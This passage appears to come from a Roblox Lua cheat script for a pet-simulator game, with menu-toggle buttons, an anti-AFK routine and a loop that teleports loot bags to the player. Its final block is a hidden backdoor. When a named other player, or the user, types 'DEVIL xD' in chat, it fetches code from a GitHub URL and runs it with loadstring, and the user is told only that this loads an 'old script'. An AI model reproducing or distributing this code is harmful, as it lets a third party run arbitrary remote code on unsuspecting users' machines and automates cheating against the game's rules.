    game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Bank.Enabled
end)

i:Button("Pet Collection", function()
    game:GetService("Players").LocalPlayer.PlayerGui.Collection.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Collection.Enabled
end)

i:Button("Fuse Pets", function()
    game:GetService("Players").LocalPlayer.PlayerGui.FusePets.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.FusePets.Enabled
end)

i:Button("Gold Machine", function()
    game:GetService("Players").LocalPlayer.PlayerGui.Golden.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Golden.Enabled
end)

i:Button("Rainbow Machine", function()
    game:GetService("Players").LocalPlayer.PlayerGui.Rainbow.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Rainbow.Enabled
end)

i:Button("DarkMatter Machine", function()
    game:GetService("Players").LocalPlayer.PlayerGui.DarkMatter.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.DarkMatter.Enabled
end)

i:Button("Merchant", function()
    game:GetService("Players").LocalPlayer.PlayerGui.Merchant.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.Merchant.Enabled
end)

i:Button("Enchant", function()
    game:GetService("Players").LocalPlayer.PlayerGui.EnchantPets.Enabled = not game:GetService("Players").LocalPlayer.PlayerGui.EnchantPets.Enabled
end)


local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
print("Anti Afk Loaded")
end)

Spawn(function()
    getgenv().collectalllootbags = true
    while collectalllootbags do
        wait()
        for i,v in pairs(game:GetService("Workspace")["__THINGS"].Lootbags:GetChildren()) do
           if v.ClassName == "MeshPart" then
               v.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
           end
        end
        wait(1)
    end
end)

spawn(function()

local Yourself = true 
local player = "GlitchGame_ALT"
local command = "DEVIL xD"

if Yourself == true then
    for _,v in pairs(game.Players:GetPlayers()) do
        if player:lower() == v.Name:lower():sub(1,#player) then
            v.Chatted:Connect(function(msg)
                if msg:lower() == command:lower() then
                    print("DEVIL is here")
                    spawn(function()
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/yochaipetvannesimulatorho/main/psxkovipwalascript", true))()
                    end)
                end
            end)
        end
    end
end

if Yourself == true then
    game.Players.LocalPlayer.Chatted:Connect(function(msg)
        if msg:lower() == command:lower() then
            print("You used command :)")
            spawn(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/myladoisbig/yochaipetvannesimulatorho/main/psxkovipwalascript", true))()
            end)
        end
    end)
end

  local vu = game:GetService("VirtualUser")
      for i = 1, 1 do
      game:GetService"StarterGui":SetCore('SendNotification', {
          Title = "Hey!";
          Text = "If you want to use old script then type in chat - DEVIL xD";
          Duration = 5;
      })
  end
end)
